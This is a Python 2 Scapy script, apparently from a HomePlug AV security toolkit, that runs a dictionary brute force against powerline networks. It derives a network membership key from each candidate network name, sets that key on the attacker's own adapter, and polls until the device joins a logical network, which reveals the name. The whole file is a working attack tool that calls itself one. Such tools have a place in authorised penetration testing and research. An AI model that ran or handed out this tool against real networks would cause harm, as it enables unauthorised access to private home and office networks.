#!/usr/bin/en python2

from scapy.all import *
from layerscapy.HomePlugAV import *
from optparse import OptionParser
from PBKDF1 import *
import time

def checkAVLN(interface, mac):
    # Building packet
    pkt = Ether(
        dst=mac,
    ) / HomePlugAV(
    ) / NetworkInformationRequest(
    )
    # Sending packet
    ans = srp1(pkt, iface=interface, verbose=False)
    # Checking answer to determine if STA is member of an AVLN
    if ans.haslayer(NetworkInfoConfirmationV10) or ans.haslayer(NetworkInfoConfirmationV11):
        if ans[NetworkInfoConfirmationV10].LogicalNetworksNumber > 0:
            return True

    return False

def networkName2NMK(networkName):
    pbkdf1 = PBKDF1(networkName, NMK_SALT, 16, hashlib.sha256())
    return binascii.unhexlify(pbkdf1)


def setNMK(interface, mac, nmk):
    # Building packet
    pkt = Ether(
        dst=mac,
    ) / HomePlugAV(
    ) / SetEncryptionKeyRequest(
        NMK=nmk,
        DestinationMAC=mac,
        EKS=1,
        PayloadEncKeySelect=0x0f,
        DAK=0
    )
    # Sending packet and capturing answer
    ans = srp1(pkt, iface=interface, verbose=False)
    # Checking if operation succeeded
    if ans.haslayer(SetEncryptionKeyConfirmation):
        return True
    return False


if __name__ == "__main__":
    ###     Argument Parser ######
    usage = "usage: %prog [options] arg"
    parser = OptionParser(usage)
    parser.add_option("-i", "--iface", dest="iface", default="eth0",
                      help="select an interface to Enable sniff mode and sniff indicates packets", metavar="INTERFACE")
    parser.add_option("-m", "--mac", dest="mac", default="00:c4:ff:ee:00:00", help="MAC address of the attacker PLC",
                      metavar="MAC")
    parser.add_option("-t", "--timeout", dest="timeout", default="8",
                      help="Maximum waiting time (in seconds) between setting NMK and checking if the PLC joined an AVLN",
                      metavar="TIMEOUT")
    parser.add_option("-d", "--dictionary", dest="dict",
                      help="Dictionary file, one network name per line",
                      metavar="DICTIONARY")
    (options, args) = parser.parse_args()

    ####    Attack   ####

    try:
        f = open(options.dict, 'r')
    except:
        print("[!] Error reading dictionary file. Does the file exist?")
        exit()

    dict = [line.rstrip('\n') for line in f]

    print("[*] Dictionary file read. There are " + str(len(dict)) + " network names to be tried.")
    print("[*] MAC of local PLC: " + options.mac)
    print("[*] Starting NMK brute force")

    for networkName in dict:
        print("\n[*] Setting Network name to: " + networkName + "...")
        if setNMK(options.iface, options.mac, networkName2NMK(networkName)):
            print("[*] Success. Checking if STA joined an AVLN... ")

            startTime = time.time()
            timeout = float(options.timeout)
            while (time.time() - startTime) <= timeout:
                if checkAVLN(options.iface, options.mac):
                    print("[*] STA joined an AVLN. Network name found!! => " + networkName)
                    exit()
            print("Timeout.")

        else:
            print("[!] Error setting Network Name: " + networkName)
